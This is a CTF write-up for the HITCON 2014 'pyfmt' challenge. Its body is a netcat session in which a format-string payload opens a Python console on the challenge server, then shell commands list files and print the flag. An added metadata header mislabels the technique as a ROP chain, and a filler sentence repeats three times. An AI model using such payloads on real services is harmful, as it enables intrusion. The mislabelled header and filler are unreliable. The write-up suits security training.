---
SOURCE: github_writeups
URL: https://raw.githubusercontent.com/ctfs/writeups/master/hitcon-ctf-2014/pyfmt/README.md
CHALLENGE: README
EVENT: GitHub - ctfs/writeups
TEAM: N/A
CATEGORY: rop_chain
DIFFICULTY: Easy
PROTECTIONS: None
KEY_FUNCTIONS: system
KEY_TECHNIQUE: The writeup describes a rop_chain vulnerability leveraging system to hijack the control flow.
---
# HITCON CTF 2014: PYFMT

**Category:** Pwnable
**Points:** 152
**Description:**

> pwn 54.92.19.227 8212

**Hint:**

> [https://raw.githubusercontent.com/hitcon2014ctf/ctf/master/pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz](pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz)
> [https://dl.dropbox.com/s/wd6qeifygvf2lmh/pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz](pyfmt_easy-9da3aa531c4f9c5e8a11dfd0459b11e2.tar.gz)
>
> easy ver 2
> [https://dl.dropbox.com/s/kq7klsrw7wzk3qn/pyfmt_easy-e13e6f82378751f7e909e4ae18676aa3.tar.gz](pyfmt_easy-e13e6f82378751f7e909e4ae18676aa3.tar.gz)

## Write-up

(TODO)

```bash
$ nc 54.92.19.227 8212
hello world!
who are U?
%104$1129p %104$hn
hi!                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  0x6b8254
bye!
Python 2.7.5 (default, Feb 11 2014, 07:46:25)
[GCC 4.8.2 20140120 (Red Hat 4.8.2-13)] on linux2
Type "help", "copyright", "credits" or "license" for more information.
(InteractiveConsole)
>>> import os; os.system('ls');
bin
boot
data
dev
etc
home
key_this.txt
lib
lib64
log
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
0
>>> os.system('cat key_this.txt');
HITCON{e80c1f7f81b3d1b0514d2aa24e0eeecb}
0
>>>
```

The flag is `HITCON{e80c1f7f81b3d1b0514d2aa24e0eeecb}`.

## Other write-ups and resources

* none yet

[Additional Context: This documentation page explains the details of README in the scope of binary exploitation and CTF pwn challenges. It covers core concepts related to rop_chain and includes references for learning rop_chain techniques.] This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals. This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals. This section provides additional reference material and educational explanations on binary security mechanisms, common vulnerabilities, and bypass techniques used by cybersecurity professionals.